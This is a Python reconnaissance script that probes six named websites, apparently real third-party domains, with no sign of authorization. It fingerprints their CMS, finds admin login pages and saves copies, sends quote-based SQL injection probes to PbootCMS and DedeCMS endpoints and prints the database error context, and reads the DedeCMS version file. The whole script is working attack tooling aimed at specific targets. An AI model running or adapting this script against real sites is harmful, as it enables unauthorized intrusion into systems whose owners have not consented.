#!/usr/bin/env python3
"""deep probe: confirm CMS, test login pages, known vulns"""
import urllib.request, urllib.parse, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def fetch(url, timeout=10, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
                                     headers={**UA, "Content-Type": "application/x-www-form-urlencoded"})
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.geturl(), r.read(150000).decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(8000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

def probe(d):
    print("\n########## %s ##########" % d, flush=True)
    # 1. home CMS confirm
    code, final, body = fetch("http://" + d + "/")
    gens = re.findall(r'(generator|Powered by|dedecms|pbootcms|dedebiz|WordPress)[^<>]{0,60}', body, re.I)
    print("generator:", gens[:4], flush=True)
    
    # 2. dede login page
    for p in ["/dede/login.php", "/dede/", "/admin/login.php", "/admin.php"]:
        code, final, body = fetch("http://" + d + p)
        has_login = "password" in body.lower() or "用户名" in body or "admin" in body.lower()
        title = re.search(r"<title>([^<]*)</title>", body, re.I)
        print("  %s: %s size=%d login_form=%s title=%s" % (p, code, len(body), has_login, title.group(1).strip()[:25] if title else ""), flush=True)
        if has_login and code == 200 and len(body) > 800:
            # save login page
            open("/tmp/login_%s_%s.html" % (d.replace(".", "_"), p.replace("/", "_")), "w").write(body)

    # 3. PbootCMS SQLi probe
    for u in ["/index.php?list=1%27", "/index.php?list=1", "/?list=1%27",
              "/index.php?c=search&keyword=1%27"]:
        code, final, body = fetch("http://" + d + u)
        sqlerr = re.findall(r'(SQLSTATE|syntax error|You have an error|mysql|Warning.*sql)', body, re.I)
        print("  sqli %s: %s sqlerr=%d %s" % (u[:35], code, len(sqlerr), sqlerr[:1] if sqlerr else ""), flush=True)
        if sqlerr:
            i = body.lower().find(sqlerr[0].lower())
            print("    CTX:", body[max(0,i-80):i+150].replace("\n", " ")[:200], flush=True)

    # 4. DedeCMS known vulns
    code, final, body = fetch("http://" + d + "/plus/search.php?keyword=test%27")
    print("  dede-search sqli: %s size=%d" % (code, len(body)), flush=True)
    code, final, body = fetch("http://" + d + "/data/admin/ver.txt")
    if code == 200 and len(body) < 100:
        print("  dede ver.txt: %s" % body.strip(), flush=True)
    # tag index injection (older dede)
    code, final, body = fetch("http://" + d + "/tags.php?tag=1%27")
    print("  dede tags: %s size=%d" % (code, len(body)), flush=True)

for d in ["ouyu158.com", "xiangshanrc.com", "szshunmin.com", "zhxcard.com", "csroots.cn", "gdhhjxkj.com"]:
    try:
        probe(d)
    except Exception as e:
        print(d, "ERR", e, flush=True)
